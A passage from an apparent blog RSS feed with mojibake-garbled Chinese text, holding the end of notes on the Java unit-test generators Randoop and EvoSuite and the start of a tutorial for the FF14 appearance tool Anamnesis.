sequence</p><ol><li>é€šè¿‡æ‰©å±•ï¼ˆextensionï¼‰ï¼šè·å–ä¸€ä¸ªåºåˆ—å¹¶åœ¨åº•éƒ¨æ·»åŠ ä¸€ä¸ªæ–°è¯­å¥</li><li>ä½¿ç”¨ä¸²è”ï¼ˆconcatenationï¼‰ï¼šç»™çš„åºåˆ— s1ã€s2ã€s3ï¼Œåˆ›å»ºä¸²è”çš„æ–°åºåˆ—<ul><li>Randoop ç»„åˆåˆ›å»ºæ–°åºåˆ—çš„æ–¹æ³•</li></ul></li><li>ä»å­—ç¬¦ä¸²ä¸­è§£æï¼ˆparseableï¼‰å‡ºåºåˆ—</li></ol><p>æ³¨æ„ï¼šSequence æ˜¯ä¸å¯å˜çš„ï¼Œæ‰©å±•æ“ä½œè¿”å›æ–°åºåˆ—ã€‚</p><p>å¦‚æœä»£ç æ¶‰åŠå‚æ•°åŒ–ç±»å‹ï¼Œé‚£å°±éœ€è¦å®ä¾‹åŒ–ä½¿ç”¨çš„æ³›å‹ç±»ç±»å‹ï¼Œä»¥ä¾¿è·å¾—éœ€è¦çš„ç±»å‹æ›¿æ¢ã€‚</p><h3 id="ExecutableSequence"><a href="#ExecutableSequence" class="headerlink" title="ExecutableSequence"></a>ExecutableSequence</h3><p>ExecutableSequence åŒ…è£… Sequence å¹¶æ·»åŠ ä¸¤ä¸ªåŠŸèƒ½ï¼š</p><ul><li>ExecutableSequence å¯ä»¥é€šè¿‡å¯¹é¢„æœŸå±æ€§çš„æ£€æŸ¥æ¥å¢å¼ºã€‚ Check æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè¡¨ç¤ºåºåˆ—çš„æŸäº›é¢„æœŸå±æ€§ï¼›ä¾‹å¦‚ï¼Œåºåˆ—ä¸­çš„ç‰¹å®šæ–¹æ³•è°ƒç”¨æ­£å¸¸è¿”å›ã€‚å½“å¯æ‰§è¡Œåºåˆ—è¢«æ‰§è¡Œæ—¶ï¼Œåºåˆ—ä¸­å­˜åœ¨çš„ä»»ä½•æ£€æŸ¥éƒ½ä¼šåœ¨è¿è¡Œæ—¶æ£€æŸ¥ï¼Œå¹¶ä¸”æ£€æŸ¥çš„é€šè¿‡&#x2F;å¤±è´¥çŠ¶æ€å¯ä¾›å®¢æˆ·ç«¯æ£€æŸ¥ã€‚</li><li>ExecutableSequence å¯ä»¥æ‰§è¡Œã€‚ Randoop ä½¿ç”¨ Java çš„åå°„æœºåˆ¶æ¥è°ƒç”¨åºåˆ—ä¸­çš„æ–¹æ³•å’Œæ„é€ å‡½æ•°ï¼Œå¹¶ä½¿ç”¨åº•å±‚ Sequence çš„ç»“æ„æ¥ç¡®å®šè¦ä¼ é€’ç»™å®ƒä»¬çš„è¾“å…¥ã€‚</li></ul><p>æ‰§è¡Œ sequence</p><ul><li>åœ¨ execute æ–¹æ³•è¿”å›åï¼Œå¯ä»¥é€šè¿‡ getResult(int i) æ–¹æ³•è®¿é—®æ‰§è¡Œè¿‡ç¨‹ä¸­åˆ›å»ºçš„è¿è¡Œæ—¶å¯¹è±¡ï¼Œè¯¥æ–¹æ³•è¿”å›æ‰§è¡Œè¯­å¥ i çš„ç»“æœã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ExecutableSequence</span> <span class="variable">es</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExecutableSequence</span>(s);</span><br><span class="line">es.execute(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">ExecutionOutcome</span> <span class="variable">resultAt3</span> <span class="operator">=</span> es.getResult(<span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>æ›´å¤šå†…å®¹å‚è§ Execution å’Œ ExecutionOutcome ç±»ã€‚</p><h3 id="Check"><a href="#Check" class="headerlink" title="Check"></a>Check</h3><p>Check æ˜¯è¡¨ç¤ºåºåˆ—çš„é¢„æœŸå±æ€§çš„å¯¹è±¡ã€‚å°±å•å…ƒæµ‹è¯•è€Œè¨€ï¼ŒCheck ä»£è¡¨å•å…ƒæµ‹è¯•çš„ä¸€äº›æ£€æŸ¥ä»£ç ã€‚</p><p>æ¯ä¸ª Check éƒ½ä¸åºåˆ—ä¸­çš„ä¸€ä¸ªç´¢å¼•ç›¸å…³è”ï¼Œå…¶ä¸­è¯¥ç´¢å¼•è¡¨ç¤ºåº”è¯¥æ‰§è¡Œæ£€æŸ¥çš„æ—¶é—´ã€‚</p><p>Randoop é€šè¿‡ç»„åˆå’Œæ‰©å±•ä¹‹å‰ç”Ÿæˆçš„åºåˆ—æ¥éšæœºç”Ÿæˆæµ‹è¯•è¾“å…¥ï¼ˆSequenceï¼‰ã€‚å¦ä¸€æ–¹é¢ï¼ŒRandoop ç¡®å®šæ€§åœ°æ‰§è¡Œå…¶æ£€æŸ¥ã€‚å¯¹äºåˆ›å»ºçš„æ¯ä¸ªåºåˆ—ï¼Œå®ƒéƒ½ä¼šæ£€æŸ¥è¯¥åºåˆ—çš„æ‰€æœ‰å¯¹è±¡ã€‚</p><h3 id="ForwardGenerator"><a href="#ForwardGenerator" class="headerlink" title="ForwardGenerator"></a>ForwardGenerator</h3><p>é€‰æ‹©å™¨æœ‰ä¸¤ä¸ªï¼š</p><ul><li><code>inputSequenceSelector</code>ï¼šé€‰æ‹©åºåˆ—</li><li><code>operationSelector</code>ï¼šé€‰æ‹©æ–¹æ³•</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** How to select sequences as input for creating new sequences. */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> InputSequenceSelector inputSequenceSelector;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** How to select the method to use for creating a new sequence. */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> TypedOperationSelector operationSelector;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œåºåˆ—ï¼Œåœ¨è¯¥æ–¹æ³•ä¸­å¯ä»¥è·å¾—åºåˆ—æ¯æ¡è¯­å¥çš„æ‰§è¡Œç»“æœ</p><ul><li>æ£€æŸ¥è¾“å‡ºçš„æ–‡æœ¬ä¿¡æ¯</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@Nullable</span> ExecutableSequence <span class="title function_">step</span><span class="params">()</span> &#123;...&#125;</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆåºåˆ—ï¼Œåœ¨è¯¥æ–¹æ³•ä¸­å¯ä»¥é€‰æ‹©ä¸‹ä¸€æ¡è¯­å¥ï¼ˆOperationï¼‰å¹¶è¿›è¡Œæ‹¼æ¥</p><ul><li>é»˜è®¤ä½¿ç”¨éšæœºå‡åŒ€çš„é€‰æ‹©å™¨</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ExecutableSequence <span class="title function_">createNewUniqueSequence</span><span class="params">()</span> &#123;...&#125;</span><br></pre></td></tr></table></figure><p>Operation é›†åˆä»å“ªé‡Œæ¥ï¼Ÿ</p><ul><li>é€šè¿‡åå°„éå†ç±»å½“ä¸­çš„æ–¹æ³•ï¼Œå°†è®¿é—®ä¿¡æ¯è¾“å‡ºåˆ°æ—¥å¿—ä¸­</li><li>reflection ç›®å½•ä¸‹æœ‰å¤šç§ä¸åŒçš„ Extractorï¼Œç”¨äºæå–ä¿¡æ¯</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ForwardGenerator</span><br><span class="line">GenTests#handle</span><br><span class="line">OperationModel#createModel</span><br><span class="line">OperationModel#addOperationsFromClasses</span><br><span class="line">OperationExtractor#operations</span><br><span class="line">ReflectionManager#apply</span><br></pre></td></tr></table></figure><h1 id="EvoSuite"><a href="#EvoSuite" class="headerlink" title="EvoSuite"></a>EvoSuite</h1><h2 id="å®éªŒ-1"><a href="#å®éªŒ-1" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h2><p>ç›¸æ¯” Randoopï¼ŒEvoSuite çš„è¯´æ˜å°±ç®€é™‹äº†å¾ˆå¤šï¼Œä½†æ˜¯è¾“å‡ºçš„ä¿¡æ¯éå¸¸å¤šã€‚</p><p>EvoSuite çš„å¤§é‡å‚æ•°éƒ½æ”¾åœ¨äº† <code>-D</code> é€‰é¡¹ä¸­ï¼Œéœ€è¦ç”¨é”®å€¼çš„æ–¹å¼ç»™å‡º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¸®åŠ©ä¿¡æ¯</span></span><br><span class="line">java -jar evosuite-1.2.0.jar -<span class="built_in">help</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯ç”¨å‚æ•°</span></span><br><span class="line">java -jar evosuite-1.2.0.jar -listParameters</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆæµ‹è¯•ï¼Œé»˜è®¤ -generateMOSuiteï¼Œè¿è¡Œ 40min æœªå®Œæˆ</span></span><br><span class="line">java -jar evosuite-1.2.0.jar -target test.jar -generateMOSuite</span><br></pre></td></tr></table></figure><p>æŠ¥é”™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR AgentLoader - Exception class java.lang.RuntimeException: AttachProvider.providers() failed to <span class="built_in">return</span> any provider. Tool classloader: java.net.FactoryURLClassLoader@2c537884</span><br></pre></td></tr></table></figure><p>æ‰”åˆ° linux ç¯å¢ƒä¸‹å¯ä»¥æˆåŠŸæ‰§è¡Œï¼Œæ‰§è¡Œå°†ç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼š</p><ul><li>evosuite-testsï¼šç”Ÿæˆçš„å•å…ƒæµ‹è¯•</li><li>evosuite-reportï¼šåŒ…å« csv ç»Ÿè®¡æ•°æ®å’Œ html æŠ¥å‘Šï¼Œä¾‹å¦‚å‡ºå‚æ•°ã€æµ‹è¯•ç”¨ä¾‹ã€è¦†ç›–ç‡ç­‰ä¿¡æ¯</li></ul><img src="https://s2.loli.net/2022/04/27/LjWs8qkuvXh6M3b.png" ><p>ä»è¾“å‡ºçš„æµ‹è¯•æ¥çœ‹ï¼Œä¼¼ä¹æ˜¯å¯¹æ¯ä¸ªç±»ç”Ÿæˆæµ‹è¯•ï¼ˆè€Œ Randoop æ˜¯éšæœºå¯¼å‘æµ‹è¯•ï¼‰</p><img src="https://s2.loli.net/2022/04/27/R9Ek6ZUlqFt4esM.png" ><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><ol><li><p>å’Œæ—¶é—´ç›¸å…³çš„å‚æ•°å¾ˆå¤šï¼Œå¯é…ç½®å‚æ•°å¤ªå¤š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -D å¯é€‰å‚æ•°</span></span><br><span class="line">search_budgetlong60Maximum search duration</span><br></pre></td></tr></table></figure></li><li><p>ç»Ÿè®¡ä¿¡æ¯å¾ˆå¤šï¼Œä½†ä¸ä¸€å®šéƒ½ç”¨å¾—åˆ°</p></li><li><p>ä»å¯ç”¨å‚æ•°å¸®åŠ©ä¿¡æ¯æ¥çœ‹ï¼Œå¯ä»¥æœ€åè¿›è¡Œè¿‡æ»¤ï¼Œæˆ–ç›´æ¥æŒ‡å®šç”Ÿæˆæµ‹è¯•ä½¿ç”¨çš„æ–¹æ³•</p><ul><li>æ²¡æœ‰è¯´æ˜å¦‚æœå­˜åœ¨ä¾èµ–ä¼šæ˜¯ä»€ä¹ˆæƒ…å†µ</li><li>æ³¨ï¼šéœ€è¦ä½¿ç”¨å­—èŠ‚ç ç­¾å</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-class &lt;arg&gt;target class <span class="keyword">for</span> <span class="built_in">test</span> generation. A fully qualifying needs to be provided, e.g. org.foo.SomeClass</span><br><span class="line"><span class="comment"># -D å¯é€‰å‚æ•°</span></span><br><span class="line">junit_strictboolean<span class="literal">false</span>Only include <span class="built_in">test</span> files containing the target classname</span><br><span class="line">target_methodStringMethod <span class="keyword">for</span> <span class="built_in">which</span> to generate tests</span><br><span class="line">target_method_listStringA colon(:) separated list of methods <span class="keyword">for</span> <span class="built_in">which</span> to generate tests</span><br></pre></td></tr></table></figure></li><li><p>ç”Ÿæˆçš„å•å…ƒæµ‹è¯•ä¾èµ– EvoSuite æ¡†æ¶æœ¬èº«ï¼Œéœ€è¦æ·»åŠ  evosuite-standalone-runtime.jar</p></li></ol><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://github.com/JuYoungJeon/randoopTutorial">randoopTutorial</a></li><li><a href="https://www.youtube.com/watch?v=FR89jtjBCEA">Generating JUnit test suites with Randoop</a></li><li><a href="https://qiita.com/taka_22/items/cd0a7ed1ed10635fc1a3">Javaç”¨JUnitãƒ†ã‚¹ãƒˆã‚¯ãƒ©ã‚¹ã‚¸ã‚§ãƒãƒ¬ãƒ¼ã‚¿Randoopã«ã¤ã„ã¦èª¿ã¹ã¦ã¿ãŸ</a></li><li><a href="https://medium.com/@marcus.jonssonewerbring/tutorial-an-introduction-to-unit-test-regression-test-and-code-coverage-with-intellij-b08be1268719">[Tutorial] An introduction to unit test, regression test and code coverage with IntelliJ</a></li><li><a href="https://randoop.github.io/randoop/manual/index.html">Randoop Manual</a></li><li><a href="https://randoop.github.io/randoop/manual/dev.html">Randoop Developerâ€™s Manual</a></li><li><a href="https://randoop.github.io/randoop/projectideas.html">Randoop project ideas</a></li><li><a href="https://www.evosuite.org/documentation/commandline/">Commandline | EvoSuite</a></li><li><a href="https://www.evosuite.org/documentation/tutorial-part-1/">Tutorial Part 1: EvoSuite on the Command Line</a></li><li><a href="https://github.com/EvoSuite/evosuite/issues/47">class com.sun.tools.attach.AttachNotSupportedException no providers installed #47</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://jckling.github.io/categories/Other/">Other</category>
      
      
      <category domain="https://jckling.github.io/tags/Java/">Java</category>
      
      
      <comments>https://jckling.github.io/2022/04/27/Other/Java%20%E8%87%AA%E5%8A%A8%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>FF14 Anamnesis ä½¿ç”¨æ•™ç¨‹</title>
      <link>https://jckling.github.io/2022/03/23/Game/FFXIV/FF14-Anamnesis%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</link>
      <guid>https://jckling.github.io/2022/03/23/Game/FFXIV/FF14-Anamnesis%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</guid>
      <pubDate>Wed, 23 Mar 2022 01:21:02 GMT</pubDate>
      
      <description>CMTool çš„ä¸Šä½æ›¿ä»£å·¥å…·ï¼Œä»…æ¨èä½¿ç”¨ Anamnesis</description>
      
      
      
      <content:encoded><![CDATA[<div class="note warning flat"><ol><li><p>Anamnesis æ”¯æŒå›½é™…æœï¼Œå¯¹å›½æœçš„åŠŸèƒ½æ”¯æŒæœ‰é™ï¼›æ”¯æŒä¸­æ–‡ï¼›ä»…æ”¯æŒ 64 ä½ Windows 10 åŠä»¥ä¸Šç‰ˆæœ¬ï¼›ä»…æ”¯æŒ DX11ã€‚</p></li><li><p>å›½æœï¼ˆ6.45ï¼‰è¯·ä½¿ç”¨ <a href="https://github.com/imchillin/Anamnesis/releases/tag/v2023-07-18">2023-07-18</a>ï¼Œé‡åˆ°é”™è¯¯å¯ä»¥å°è¯•å®‰è£…æ›´æ–°çš„ç‰ˆæœ¬ï¼Œæœ€æ–°ç‰ˆé€‚é…å›½é™…æœ 6.51ã€‚</p></li><li><p>ä½¿ç”¨è¿‡ç¨‹ä¸­è‹¥å‘ç°ä¸­æ–‡ç¿»è¯‘æœ‰é—®é¢˜è¯·åé¦ˆã€‚</p></li><li><p>æ— æ³•è®¿é—®&#x2F;ä¸‹è½½è¯·å°è¯•æŒ‚æ¢¯å­ã€‚</p></li></ol><p><em>PSï¼šè¯„è®ºå®¡æ ¸éœ€è¦æ—¶é—´ï¼Œä¸è¦é‡å¤åˆ·è¯„è®º</em> ğŸ†˜</p></div><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¹‹å‰ç”¨ CMTool æ¢è£…å¤‡æ”¹æ—¶é—´ï¼Œæœ€è¿‘æ›´æ–°çš„ v2.0.15.4 æ”¯æŒå›½æœï¼Œä½†ä¸€ç”¨ç›®æ ‡æ¨¡å¼åŠ è½½è£…å¤‡å°±å¯¼è‡´æ¨¡å‹æ¶ˆå¤±ï¼Œä¸å¾—ä¸è¿”å›æ ‡é¢˜ç•Œé¢é‡æ–°è¿›æ¸¸æˆï¼Œå››èˆäº”å…¥å°±æ˜¯æ²¡æ³•ç”¨ã€‚é‡æ–°ç¿»äº†ä¸‹ Anamnesis çš„ <a href="https://github.com/imchillin/Anamnesis/wiki/Troubleshooting">Troubleshooting</a>ï¼Œå‘ç°æ˜¯è¯´ <strong>å¯¹å›½æœçš„æ”¯æŒä¸å®Œæ•´</strong>ï¼Œå¹¶ä¸æ˜¯å®Œå…¨ä¸èƒ½ç”¨ã€‚</p><blockquote><p>Make sure you are running the International client of the game (JP&#x2F;NA&#x2F;EU). Note that the Chinese and Korean clients are not fully supported at this time, so you may have limited use of the tool with these clients.</p></blockquote><p>Anamnesis å’Œ CMTool ä¸€æ ·ï¼Œä¿®æ”¹çš„æ˜¯æœ¬åœ°å®¢æˆ·ç«¯æ•°æ®ï¼Œå¯ä»¥åœ¨æ¸¸æˆä¸­æ›´æ”¹ç§æ—ã€æ€§åˆ«ã€å¤–è²Œã€è£…å¤‡ç­‰ï¼Œè€Œä¸ä¼šå°†æ•°æ®ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œæ‰€ä»¥<strong>å…¶ä»–ç©å®¶ä¹Ÿçœ‹ä¸åˆ°ä½ çš„æ›´æ”¹</strong>ã€‚</p><p>é™¤äº†è¿™äº›â€œæäººâ€ç›¸å…³çš„æ“ä½œï¼Œè¿˜å¯ä»¥ç”¨å®ƒå°†è§’è‰²è½¬æ¢æˆé“å…·ã€æ€ªç‰©ã€NPC ç­‰ï¼Œå› ä¸ºæ˜¯ CMTool çš„ä¸Šä½æ›¿ä»£ï¼ŒåŒæ ·æ”¯æŒåŠ è½½åŠ¨ä½œ&#x2F;è¡¨æƒ…ï¼ˆPosing Matrix æ¨¡å—ï¼‰ï¼Œåœ¨ GPose æ¨¡å¼ä¸­çš„æ—‹è½¬ã€ä½ç§»ç­‰ã€‚</p><p><strong>æ³¨æ„ï¼š</strong>ä»…æ”¯æŒ 64 ä½çš„ Windows10 æˆ– Windows11ï¼Œä»…æ”¯æŒ DX11ã€‚ç”µè„‘é…ç½®ä¸ç¬¦åˆè¦æ±‚çš„å°±åªèƒ½ç”¨ CMTool äº†ï¼Œå¯èƒ½å‡ºç°åŠ è½½å¤–è§‚å¯¼è‡´æ¨¡å‹æ¶ˆå¤±ç­‰é—®é¢˜ï¼Œæš‚æ—¶è¿˜æ²¡æœ‰è§£å†³ã€‚CMTool çš„æ•™ç¨‹å¯ä»¥çœ‹ï¼š<a href="https://jckling.github.io/2021/04/26/Game/FFXIV/FF14-CMTool%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">FF14 CMTool ä½¿ç”¨æ•™ç¨‹</a>ã€‚</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><p>é¦–å…ˆéœ€è¦å®‰è£… 64 ä½çš„è¿è¡Œæ—¶ <a href="https://dotnet.microsoft.com/en-us/download/dotnet/thank-you/runtime-desktop-6.0.6-windows-x64-installer">.NET 6.0 Desktop Runtime x64</a>ï¼Œå¦‚æœæç¤ºå·²å®‰è£…æ›´é«˜ç‰ˆæœ¬çš„è¿è¡Œæ—¶åˆ™å¯ä»¥å¿½ç•¥ã€‚</p><img src="https://s2.loli.net/2023/03/05/FMrJCw7KvloE16q.jpg" style="zoom:67%;" /><p>å’Œ CMTool åŒä¸€ç»„ç»‡çš„å¼€æºè½¯ä»¶ï¼Œç›´æ¥ä¸Š Github ä¸‹è½½ï¼š<a href="https://github.com/imchillin/Anamnesis/releases">imchillin&#x2F;Anamnesis</a>ã€‚ä¸‹è½½å›¾ç¤ºä¸­çš„ zip å‹ç¼©åŒ…ï¼Œå¹¶è§£å‹åˆ°æƒ³è¦å®‰è£…çš„ç›®å½•ã€‚</p><img src="https://s2.loli.net/2022/03/25/rItXjQeaFVW4UxM.png" style="zoom:80%;" /><p>2022-03-24 ç‰ˆæœ¬è§£å‹ä¹‹ååŒ…å«ä»¥ä¸‹æ–‡ä»¶ï¼ŒåŒå‡» Anamnesis.exe å¯åŠ¨å·¥å…·ã€‚</p><img src="https://s2.loli.net/2022/03/25/SRLJiWMdkIhylAm.png" style="zoom:80%;" /><p><strong>æ³¨æ„ï¼š</strong>è¯¥å·¥å…·åŒæ ·éœ€è¦åœ¨è¿›å…¥æ¸¸æˆä¹‹åå†å¯åŠ¨ï¼Œå¦åˆ™æ˜¾ç¤ºç­‰å¾…è¿›ç¨‹ã€‚æ¯” CMTool ç–¯ç‹‚å¼¹çª—å¥½å¤šäº†xd</p><img src="https://s2.loli.net/2022/03/25/saC3hL4HNwBD2yE.jpg" style="zoom:70%;" /><p>å› ä¸º Anamnesis ä¸å®Œå…¨æ”¯æŒå›½æœï¼Œæ‰€ä»¥å¯åŠ¨åä¼šå¼¹æç¤ºç‰ˆæœ¬å¯èƒ½æœ‰é—®é¢˜ï¼Œå¿½ç•¥å³å¯ï¼Œç‚¹å‡» OK ç»§ç»­ä½¿ç”¨ã€‚</p><img src="https://s2.loli.net/2022/03/25/zLkMUR4fYHhnO1w.jpg" style="zoom:70%;" /><h1 id="åŠŸèƒ½ä»‹ç»"><a href="#åŠŸèƒ½ä»‹ç»" class="headerlink" title="åŠŸèƒ½ä»‹ç»"></a>åŠŸèƒ½ä»‹ç»</h1><p>Anamnesis ä¸€å…±åŒ…å« 5 ä¸ªé€‰é¡¹å¡ï¼Œè¿™é‡Œæ ¹æ® <a href="https://github.com/imchillin/Anamnesis/wiki">Anamnesis Wiki</a> å’Œå®é™…ä½¿ç”¨çš„ç»éªŒç®€å•ä»‹ç»ã€‚</p><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p>å·¦ä¸‹è§’çš„ <code>i</code> å›¾æ ‡ï¼ˆinfoï¼‰ï¼Œç‚¹å‡»åå³ä¾§å¼¹å‡ºæµ®å‡ºæ§ä»¶ï¼Œæ˜¾ç¤ºæœ‰å…³å·¥å…·æœ¬èº«çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ç‰ˆæœ¬å·å’Œåˆ›å»ºè¿‡ç¨‹ä¸­ä½¿ç”¨çš„å„ç§èµ„æºï¼Œä»¥åŠç¤¾äº¤åª’ä½“å’Œæ”¯æŒé“¾æ¥ï¼Œä¸‹é¢è¿˜æœ‰è®¿é—®æ—¥å¿—å’Œè®¾ç½®çš„å…¥å£ã€‚</p><img src="https://s2.loli.net/2022/03/25/oJUnbePzvIxAEZV.jpg" style="zoom:80%;" /><h2 id="Settings"><a href="#Settings" class="headerlink" title="Settings"></a>Settings</h2><p>ç‚¹å‡»æœ€ä¸Šæ–¹çš„å¸®åŠ©ä¼šå¼¹å‡º <a href="https://github.com/imchillin/Anamnesis/wiki">Wiki</a>ï¼›ç‚¹å‡»å·¦ä¸‹è§’é½¿è½®å›¾æ ‡æ‰“å¼€è®¾ç½®ï¼Œå³ä¾§å¼¹å‡ºæµ®å‡ºæ§ä»¶ï¼Œæ˜¾ç¤ºè®¾ç½®é€‰é¡¹ã€‚</p><ul><li><strong>è¯­è¨€</strong>ï¼šæ”¯æŒè‹±è¯­ã€ä¸­æ–‡ã€éŸ©è¯­ã€æ³•è¯­ç­‰ã€‚</li><li><strong>ç½®é¡¶</strong>ï¼šå…è®¸å°† Anamnesis çª—å£ä¿æŒåœ¨æ‰€æœ‰å…¶ä»–çª—å£ï¼ˆåŒ…æ‹¬æ¸¸æˆçª—å£ï¼‰ä¹‹ä¸Šï¼Œä½¿æœ€ä¸Šæ–¹çš„å›¾é’‰æŒ‰é’®ä¹Ÿå¯ä»¥æ¿€æ´»æˆ–å…³é—­ã€‚</li><li><strong>è¿·ä½ æ¨¡å¼</strong>ï¼šæ˜¾ç¤ºæ‚¬æµ® Logoï¼Œç‚¹å‡»åå±•å¼€ç•Œé¢ã€‚</li><li><strong>çª—å£é€æ˜</strong>ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œå°†é¼ æ ‡æ‚¬åœåœ¨ Anamnesis çª—å£ä¸Šä¼šå¯¼è‡´çª—å£å˜å›å®Œå…¨ä¸é€æ˜ã€‚æ¿€æ´»è¯¥é€‰é¡¹å°†ä¸€ç›´ä¿æŒè®¾ç½®çš„é€æ˜åº¦ï¼Œå¯ä»¥è¾¹æ“ä½œè¾¹çœ‹æ¸¸æˆçª—å£ã€‚</li><li><strong>çª—å£é€æ˜åº¦</strong>ï¼šé»˜è®¤ä¸º 1ï¼ˆä¸é€æ˜ï¼‰ã€‚</li><li><strong>çª—å£æ¯”ä¾‹</strong>ï¼šä¸‹æ‹‰åˆ—è¡¨åŒ…å«ä¸€ç³»åˆ—çª—å£æ¯”ä¾‹é€‰é¡¹ï¼Œ1 è¡¨ç¤ºé»˜è®¤å¤§å°ã€‚</li><li><strong>æ˜¾ç¤ºæ–‡ä»¶æ‰©å±•å</strong>ï¼šå³æ˜¾ç¤ºæ–‡ä»¶åç¼€ã€‚</li><li><strong>ä½¿ç”¨ Windows æ–‡ä»¶æµè§ˆå™¨</strong>ï¼šå³ä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„æ–‡ä»¶èµ„æºç®¡ç†å™¨ã€‚</li><li><strong>ä½¿ç”¨ Akinson Hyperlegible å­—ä½“</strong>ï¼šæ”¹å­—ä½“ï¼Œä¸ªäººè§‰å¾—é»˜è®¤çš„æ›´å¥½çœ‹ã€‚</li><li><strong>ç¯ç»•æ—‹è½¬æ»‘å—</strong>ï¼šé»˜è®¤å¯ç”¨ï¼Œæš‚æ—¶ä¸çŸ¥é“å…·ä½“å½±å“ä»€ä¹ˆã€‚</li><li><strong>ç”»å»Š</strong>ï¼šç²¾é€‰ã€æœ¬åœ°ç­‰ï¼Œä¼°è®¡æ˜¯å·¦ä¾§ä¸€ç›´åŠ è½½ä¸å‡ºæ¥çš„é¢æ¿ã€‚</li><li><strong>æ–‡ä»¶å¤¹ä½ç½®</strong>ï¼šè§’è‰²ã€åŠ¨ä½œå’Œåœºæ™¯æ–‡ä»¶çš„ä¿å­˜ä½ç½®ï¼Œç‚¹å‡» <code>...</code> æŒ‰é’®æ›´æ–°ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ–‡ä»¶ä¿å­˜åœ¨ <code>æ–‡æ¡£/Anamnesis</code> ç›®å½•ä¸‹ã€‚</li></ul><img src="https://s2.loli.net/2022/03/25/NtFvSsXaqUkw5Pp.jpg" style="zoom:80%;" /><p><strong>è¦†ç›–ç³»ç»Ÿä¸»é¢˜</strong>åå¯ä»¥é€‰æ‹©æ˜äº®æ¨¡å¼å’Œè‡ªå®šä¹‰ä¸»é¢˜è‰²ã€‚</p><img src="https://s2.loli.net/2022/03/25/Vqtb5UfgNFEj6xI.jpg" style="zoom:80%;" /><h2 id="Home"><a href="#Home" class="headerlink" title="Home"></a>Home</h2><p>ç”¨äºæ“ä½œä¸–ç•Œå’Œç›¸æœºçš„å·¥å…·ï¼Œæ˜¾ç¤ºç”»å»Šå’Œå¸®åŠ©æç¤ºã€‚å·¦ä¾§ä¸€ç›´åŠ è½½ä¸å‡ºæ¥çš„é¢æ¿åº”è¯¥å°±æ˜¯ç”»å»Šï¼Œä¸‹æ–¹æ˜¯å¸®åŠ©æç¤ºï¼Œå³ä¾§æ˜¯æ“ä½œä¸–ç•Œå’Œç›¸æœºçš„é¢æ¿ã€‚</p><p><strong>æ›´æ”¹æ—¶é—´</strong>ï¼šé¦–å…ˆéœ€è¦ç‚¹å‡»é‚£ä¸ªé”çš„å›¾æ ‡ï¼Œç„¶åå¯ä»¥ç›´æ¥æ‹–æ»šåŠ¨æ¡æˆ–è¾“å…¥æ•°å­—ã€‚</p><p><strong>æ›´æ”¹å¤©æ°”</strong>ï¼šéœ€è¦å…ˆé”å®šæ—¶é—´ï¼Œè€Œä¸”åªèƒ½åŠ 